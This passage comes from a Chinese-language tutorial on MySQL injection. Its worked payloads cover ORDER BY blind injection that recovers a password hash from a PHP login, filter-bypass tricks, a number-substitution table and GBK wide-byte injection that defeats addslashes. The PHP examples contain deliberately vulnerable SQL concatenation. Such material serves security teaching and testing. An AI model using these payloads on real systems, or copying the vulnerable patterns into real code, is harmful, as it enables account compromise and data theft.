<li>order by 大小比较盲注<h6 id="1-利用场景"><a href="#1-利用场景" class="headerlink" title="1)利用场景"></a>1)利用场景</h6><h6 id="登录代码："><a href="#登录代码：" class="headerlink" title="登录代码："></a>登录代码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter($username))&#123;</span><br><span class="line">    <span class="comment">//过滤括号</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $sql=<span class="string">"SELECT * FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    @$row = mysql_fetch_array($result);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row) &amp;&amp; $row[<span class="string">'username'</span>] === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">            <span class="comment">//Login successful</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"password error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"username does not exist!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h6 id="有下列表："><a href="#有下列表：" class="headerlink" title="有下列表："></a>有下列表：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;admin&apos;;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="这样一个一般的场景，用户登录时，用户名错误提示：用户名错误，用户名正确密码错误提示：密码错误"><a href="#这样一个一般的场景，用户登录时，用户名错误提示：用户名错误，用户名正确密码错误提示：密码错误" class="headerlink" title="这样一个一般的场景，用户登录时，用户名错误提示：用户名错误，用户名正确密码错误提示：密码错误"></a>这样一个一般的场景，用户登录时，用户名错误提示：用户名错误，用户名正确密码错误提示：密码错误</h6><h6 id="2-UNION-SELECT登录"><a href="#2-UNION-SELECT登录" class="headerlink" title="2)UNION SELECT登录"></a>2)UNION SELECT登录</h6><h6 id="看到这个逻辑第一想法肯定是直接利用union-select伪造密码登录：username-39-union-select-1-39-admin-39-39-c4ca4238a0b923820dcc509a6f75849b-amp-password-1"><a href="#看到这个逻辑第一想法肯定是直接利用union-select伪造密码登录：username-39-union-select-1-39-admin-39-39-c4ca4238a0b923820dcc509a6f75849b-amp-password-1" class="headerlink" title="看到这个逻辑第一想法肯定是直接利用union select伪造密码登录：username=&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&amp;password=1"></a>看到这个逻辑第一想法肯定是直接利用<code>union select</code>伪造密码登录：<code>username=&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&amp;password=1</code></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; union select 1,&apos;admin&apos;,&apos;c4ca4238a0b923820dcc509a6f75849b&apos;;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | c4ca4238a0b923820dcc509a6f75849b |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="但是想得到password怎么办？"><a href="#但是想得到password怎么办？" class="headerlink" title="但是想得到password怎么办？"></a>但是想得到<code>password</code>怎么办？</h6><h6 id="3-利用order-by进行盲注"><a href="#3-利用order-by进行盲注" class="headerlink" title="3)利用order by进行盲注"></a>3)利用order by进行盲注</h6><p>由登录提示可获取一个bool条件，如何用<code>order by</code>利用这个bool条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;5&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;6&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;51&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 51                               |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;52&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 52                               |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="通过逐位判断便可得到password"><a href="#通过逐位判断便可得到password" class="headerlink" title="通过逐位判断便可得到password"></a>通过逐位判断便可得到password</h6><h6 id="显然此方法在实际中使用的不多，但在一些特定的环境中也许会用到，比如实验环境，如果过滤了括号，其他盲注基本上就是废了，便可利用order-by进行注入。"><a href="#显然此方法在实际中使用的不多，但在一些特定的环境中也许会用到，比如实验环境，如果过滤了括号，其他盲注基本上就是废了，便可利用order-by进行注入。" class="headerlink" title="显然此方法在实际中使用的不多，但在一些特定的环境中也许会用到，比如实验环境，如果过滤了括号，其他盲注基本上就是废了，便可利用order by进行注入。"></a>显然此方法在实际中使用的不多，但在一些特定的环境中也许会用到，比如实验环境，如果过滤了括号，其他盲注基本上就是废了，便可利用order by进行注入。</h6><h5 id="5-逗号被过滤-拦截"><a href="#5-逗号被过滤-拦截" class="headerlink" title="5.逗号被过滤/拦截"></a>5.逗号被过滤/拦截</h5><h6 id="1-改用盲注"><a href="#1-改用盲注" class="headerlink" title="1).改用盲注"></a>1).改用盲注</h6><h6 id="2-使用join语句代替"><a href="#2-使用join语句代替" class="headerlink" title="2).使用join语句代替"></a>2).使用join语句代替</h6><h6 id="3-substr-data-from-1-for-1-相当于substr-data-1-1-、limit-9-offset-4相当于limt-9-4"><a href="#3-substr-data-from-1-for-1-相当于substr-data-1-1-、limit-9-offset-4相当于limt-9-4" class="headerlink" title="3).substr(data from 1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4"></a>3).<code>substr(data from 1 for 1)</code>相当于<code>substr(data,1,1)</code>、<code>limit 9 offset 4</code>相当于<code>limt 9,4</code></h6><h6 id="例如：-3"><a href="#例如：-3" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; and ascii(substr((select user()) from 1 for 1))&gt;114;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; and ascii(substr((select user()) from 1 for 1))&gt;113;</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="6-其他系统关键字被过滤-拦截"><a href="#6-其他系统关键字被过滤-拦截" class="headerlink" title="6.其他系统关键字被过滤/拦截"></a>6.其他系统关键字被过滤/拦截</h5><h6 id="1-双写绕过关键字过滤"><a href="#1-双写绕过关键字过滤" class="headerlink" title="1).双写绕过关键字过滤"></a>1).双写绕过关键字过滤</h6><h6 id="2-使用同义函数-语句代替，如if函数可用case-when-condition-then-1-else-0-end语句代替。"><a href="#2-使用同义函数-语句代替，如if函数可用case-when-condition-then-1-else-0-end语句代替。" class="headerlink" title="2).使用同义函数/语句代替，如if函数可用case when condition then 1 else 0 end语句代替。"></a>2).使用同义函数/语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</h6><h5 id="7-单双引号被过滤-拦截-转义"><a href="#7-单双引号被过滤-拦截-转义" class="headerlink" title="7.单双引号被过滤/拦截/转义"></a>7.单双引号被过滤/拦截/转义</h5><h6 id="1-需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。"><a href="#1-需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。" class="headerlink" title="1).需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。"></a>1).需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</h6><h6 id="2-不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。"><a href="#2-不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。" class="headerlink" title="2).不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。"></a>2).不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。</h6><h6 id="3-数字被过滤-拦截"><a href="#3-数字被过滤-拦截" class="headerlink" title="3).数字被过滤/拦截"></a>3).数字被过滤/拦截</h6><h6 id="下表摘自MySQL注入技巧"><a href="#下表摘自MySQL注入技巧" class="headerlink" title="下表摘自MySQL注入技巧"></a>下表摘自<a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html" target="_blank" rel="noopener">MySQL注入技巧</a></h6><table>
<thead>
<tr>
<th align="center">代替字符</th>
<th align="center">数,字</th>
</tr>
</thead>
<tbody><tr>
<td align="center">false、!pi()</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">true、!(!pi())</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">true+true</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">floor(pi())、~~pi()</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">ceil(pi())</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">floor(version()) //注意版本</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">ceil(version())</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">ceil(pi()+pi())</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">floor(version()+pi())</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">floor(pi()*pi())</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">ceil(pi()*pi())</td>
<td align="center">10 A</td>
</tr>
<tr>
<td align="center">ceil(pi()*pi())+true</td>
<td align="center">11 B</td>
</tr>
<tr>
<td align="center">ceil(pi()+pi()+version())</td>
<td align="center">12 C</td>
</tr>
<tr>
<td align="center">floor(pi()*pi()+pi())</td>
<td align="center">13 D</td>
</tr>
<tr>
<td align="center">ceil(pi()*pi()+pi())</td>
<td align="center">14 E</td>
</tr>
<tr>
<td align="center">ceil(pi()*pi()+version())</td>
<td align="center">15 F</td>
</tr>
<tr>
<td align="center">floor(pi()*version())</td>
<td align="center">16 G</td>
</tr>
<tr>
<td align="center">ceil(pi()*version())</td>
<td align="center">17 H</td>
</tr>
<tr>
<td align="center">ceil(pi()*version())+true</td>
<td align="center">18 I</td>
</tr>
<tr>
<td align="center">floor((pi()+pi())*pi())</td>
<td align="center">19 J</td>
</tr>
<tr>
<td align="center">ceil((pi()+pi())*pi())</td>
<td align="center">20 K</td>
</tr>
<tr>
<td align="center">ceil(ceil(pi())*version())</td>
<td align="center">21 L</td>
</tr>
<tr>
<td align="center">ceil(pi()*ceil(pi()+pi()))</td>
<td align="center">22 M</td>
</tr>
<tr>
<td align="center">ceil((pi()+ceil(pi()))*pi())</td>
<td align="center">23 N</td>
</tr>
<tr>
<td align="center">ceil(pi())*ceil(version())</td>
<td align="center">24 O</td>
</tr>
<tr>
<td align="center">floor(pi()*(version()+pi()))</td>
<td align="center">25 P</td>
</tr>
<tr>
<td align="center">floor(version()*version())</td>
<td align="center">26 Q</td>
</tr>
<tr>
<td align="center">ceil(version()*version())</td>
<td align="center">27 R</td>
</tr>
<tr>
<td align="center">ceil(pi()pi()pi()-pi())</td>
<td align="center">28 S</td>
</tr>
<tr>
<td align="center">floor(pi()pi()floor(pi()))</td>
<td align="center">29 T</td>
</tr>
</tbody></table>
<h4 id="0x05-编码转换产生的问题"><a href="#0x05-编码转换产生的问题" class="headerlink" title="0x05.编码转换产生的问题"></a>0x05.编码转换产生的问题</h4><h5 id="1-宽字节注入"><a href="#1-宽字节注入" class="headerlink" title="1.宽字节注入"></a>1.<code>宽字节注入</code></h5><h6 id="什么是宽字节注入？下面举个例子来告诉你。"><a href="#什么是宽字节注入？下面举个例子来告诉你。" class="headerlink" title="什么是宽字节注入？下面举个例子来告诉你。"></a>什么是宽字节注入？下面举个例子来告诉你。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1:3306"</span>, <span class="string">"root"</span>, <span class="string">"ljdd520"</span>, <span class="string">"shopping1"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;query(<span class="string">"set names 'gbk';"</span>);</span><br><span class="line">$username = addslashes(@$_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes(@$_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from users where username = '$username' and password='$password';"</span>;</span><br><span class="line">$rs = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">echo</span> $sql.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>($rs-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="该例子与开头的很相似，只不过改变三行。"><a href="#该例子与开头的很相似，只不过改变三行。" class="headerlink" title="该例子与开头的很相似，只不过改变三行。"></a>该例子与开头的很相似，只不过改变三行。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$conn-&gt;query(<span class="string">"set names 'gbk';"</span>);</span><br><span class="line">$username = addslashes(@$_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes(@$_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure>

<h6 id="addslashes函数将会把POST接收到的username与password的部分字符进行转义处理。如下："><a href="#addslashes函数将会把POST接收到的username与password的部分字符进行转义处理。如下：" class="headerlink" title="addslashes函数将会把POST接收到的username与password的部分字符进行转义处理。如下："></a><code>addslashes</code>函数将会把POST接收到的username与password的部分字符进行转义处理。如下：</h6><ul>
<li>字符<code>&#39;、&quot;、\</code>前边会被添加上一条反斜杠<code>\</code>作为转义字符。</li>
<li>多个空格被过滤成一个空格。<h6 id="这使得我们原本的payload被转义成如下："><a href="#这使得我们原本的payload被转义成如下：" class="headerlink" title="这使得我们原本的payload被转义成如下："></a>这使得我们原本的payload被转义成如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = &apos;admin\&apos;#&apos; and password=&apos;123&apos;;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h6 id="注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为admin-39-且密码为123的用户。"><a href="#注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为admin-39-且密码为123的用户。" class="headerlink" title="注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为admin&#39;#且密码为123的用户。"></a>注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为<code>admin&#39;#</code>且密码为123的用户。</h6><h6 id="但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句："><a href="#但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句：" class="headerlink" title="但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句："></a>但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$conn-&gt;query(&quot;set names &apos;gbk&apos;;&quot;);</span><br></pre></td></tr></table></figure>

<h6 id="其作用相当于："><a href="#其作用相当于：" class="headerlink" title="其作用相当于："></a>其作用相当于：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client =&apos;gbk&apos;;</span><br><span class="line">mysql&gt;SET character_set_results =&apos;gbk&apos;;</span><br><span class="line">mysql&gt;SET character_set_connection =&apos;gbk&apos;;</span><br></pre></td></tr></table></figure>

<h6 id="当我们输入的数据为：username-df-27or-201-1-23-amp-password-123"><a href="#当我们输入的数据为：username-df-27or-201-1-23-amp-password-123" class="headerlink" title="当我们输入的数据为：username=%df%27or%201=1%23&amp;password=123"></a>当我们输入的数据为：<code>username=%df%27or%201=1%23&amp;password=123</code></h6><h6 id="经过addslashes函数处理最终变成：username-df-5c-27or-201-1-23-amp-password-123"><a href="#经过addslashes函数处理最终变成：username-df-5c-27or-201-1-23-amp-password-123" class="headerlink" title="经过addslashes函数处理最终变成：username=%df%5c%27or%201=1%23&amp;password=123"></a>经过addslashes函数处理最终变成：<code>username=%df%5c%27or%201=1%23&amp;password=123</code></h6><h6 id="经过gbk解码得到：username-運-39-or-1-1-、password-123，拼接到SQL语句得："><a href="#经过gbk解码得到：username-運-39-or-1-1-、password-123，拼接到SQL语句得：" class="headerlink" title="经过gbk解码得到：username=運&#39;or 1=1#、password=123，拼接到SQL语句得："></a>经过gbk解码得到：<code>username=運&#39;or 1=1#</code>、<code>password=123</code>，拼接到SQL语句得：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = &apos;運&apos;or 1=1#&apos; and password=&apos;123&apos;;</span><br></pre></td></tr></table></figure>

<h6 id="成功跳出了addslashes的转义限制。"><a href="#成功跳出了addslashes的转义限制。" class="headerlink" title="成功跳出了addslashes的转义限制。"></a>成功跳出了addslashes的转义限制。</h6><h6 id="具体解释"><a href="#具体解释" class="headerlink" title="具体解释"></a>具体解释</h6><h6 id="前边提到：set-names-39-gbk-39-相当于执行了如下操作："><a href="#前边提到：set-names-39-gbk-39-相当于执行了如下操作：" class="headerlink" title="前边提到：set names &#39;gbk&#39;;相当于执行了如下操作："></a>前边提到：<code>set names &#39;gbk&#39;;</code>相当于执行了如下操作：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client =&apos;gbk&apos;;</span><br><span class="line">mysql&gt;SET character_set_results =&apos;gbk&apos;;</span><br><span class="line">mysql&gt;SET character_set_connection =&apos;gbk&apos;;</span><br></pre></td></tr></table></figure>

<h6 id="那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的character-set-client所设置的编码进行转码，本例是gbk编码。"><a href="#那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的character-set-client所设置的编码进行转码，本例是gbk编码。" class="headerlink" title="那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的character_set_client所设置的编码进行转码，本例是gbk编码。"></a>那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的character_set_client所设置的编码进行转码，本例是gbk编码。</h6><h6 id="由于PHP的编码为UTF-8，我们输入的内容为-df-27，会被当做是两个字符，其中-27为单引号-39-。"><a href="#由于PHP的编码为UTF-8，我们输入的内容为-df-27，会被当做是两个字符，其中-27为单引号-39-。" class="headerlink" title="由于PHP的编码为UTF-8，我们输入的内容为%df%27，会被当做是两个字符，其中%27为单引号&#39;。"></a>由于PHP的编码为<code>UTF-8</code>，我们输入的内容为<code>%df%27</code>，会被当做是两个字符，其中<code>%27</code>为单引号<code>&#39;</code>。</h6><h6 id="经过函数addslashes处理变成-df-5c-27，-5c为反斜线-。"><a href="#经过函数addslashes处理变成-df-5c-27，-5c为反斜线-。" class="headerlink" title="经过函数addslashes处理变成%df%5c%27，%5c为反斜线\。"></a>经过函数<code>addslashes</code>处理变成<code>%df%5c%27</code>，<code>%5c</code>为反斜线<code>\</code>。</h6><h6 id="在经过客户端层character-set-client编码处理后变成：運-39-，成功将反斜线给“吞”掉了，使单引号逃逸出来。"><a href="#在经过客户端层character-set-client编码处理后变成：運-39-，成功将反斜线给“吞”掉了，使单引号逃逸出来。" class="headerlink" title="在经过客户端层character_set_client编码处理后变成：運&#39;，成功将反斜线给“吞”掉了，使单引号逃逸出来。"></a>在经过客户端层<code>character_set_client</code>编码处理后变成：<code>運&#39;</code>，成功将反斜线给“吞”掉了，使单引号逃逸出来。</h6><h5 id="2-Latin1默认编码"><a href="#2-Latin1默认编码" class="headerlink" title="2.Latin1默认编码"></a>2.Latin1默认编码</h5><h6 id="接下来我们就讲一讲latin1造成的编码问题。"><a href="#接下来我们就讲一讲latin1造成的编码问题。" class="headerlink" title="接下来我们就讲一讲latin1造成的编码问题。"></a>接下来我们就讲一讲latin1造成的编码问题。</h6><h6 id="例如：-4"><a href="#例如：-4" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"ljdd520"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* check connection */</span></span><br><span class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    printf(<span class="string">"Connect failed: %s\n"</span>, $mysqli-&gt;connect_error);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(<span class="string">"set names utf8"</span>);</span><br><span class="line"></span><br><span class="line">$username = addslashes($_GET[<span class="string">'username'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//我们在其基础上添加这么一条语句。</span></span><br><span class="line"><span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You can't do this."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Select queries return a resultset */</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM `table1` WHERE username='&#123;$username&#125;'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result = $mysqli-&gt;query( $sql )) &#123;</span><br><span class="line">    printf(<span class="string">"Select returned %d rows.\n"</span>, $result-&gt;num_rows);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($row = $result-&gt;fetch_array(MYSQLI_ASSOC))</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($row);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free result set */</span></span><br><span class="line">    $result-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    var_dump($mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="建表语句如下："><a href="#建表语句如下：" class="headerlink" title="建表语句如下："></a>建表语句如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `table1` (</span><br><span class="line">  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) COLLATE latin1_general_ci NOT NULL,</span><br><span class="line">  `password` varchar(255) COLLATE latin1_general_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;</span><br></pre></td></tr></table></figure>

